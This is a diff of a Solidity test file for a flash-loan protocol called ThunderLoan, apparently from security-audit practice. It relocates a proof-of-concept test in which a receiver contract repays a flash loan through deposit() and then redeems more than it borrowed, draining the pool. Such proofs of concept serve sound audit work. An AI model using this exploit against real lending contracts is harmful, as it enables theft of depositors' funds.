@@ -189,25 +189,6 @@ contract ThunderLoanTest is BaseTest {
         console.log("Normal fee is : ", normalFeeCost);
     }
 
-    function testUseDepositInsteadOfRepayToStealFunds()
-        public
-        setAllowedToken
-        hasDeposits
-    {
-        uint256 amountToBorrow = 50e18;
-        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
-
-        vm.startPrank(user);
-        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
-        tokenA.mint(address(dor), fee);
-        // tokenA.approve(address(thunderLoan), fee);
-        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
-        dor.redeemMoney();
-        vm.stopPrank();
-
-        assert(tokenA.balanceOf(address(dor)) > amountToBorrow + fee);
-    }
-
     function testUpgradeBreaks() public {
         uint256 feeBefore = thunderLoan.getFee();
 
@@ -223,6 +204,25 @@ contract ThunderLoanTest is BaseTest {
 
         assert(feeBefore != feeAfter);
     }
+
+    function testUseDepositInsteadOfRepayToStealFunds()
+        public
+        setAllowedToken
+        hasDeposits
+    {
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+
+        vm.startPrank(user);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fee);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+
+        assert(tokenA.balanceOf(address(dor)) > amountToBorrow + fee);
+    }
+
 }
 
 contract DepositOverRepay is IFlashLoanReceiver {
@@ -245,7 +245,6 @@ contract DepositOverRepay is IFlashLoanReceiver {
         assetToken = thunderLoan.getAssetFromToken(IERC20(token));
         IERC20(token).approve(address(thunderLoan), amount + fee);
         thunderLoan.deposit(IERC20(token), amount + fee);
-        // IERC20(token).transfer(address(thunderLoan), amount);
         return true;
     }
 
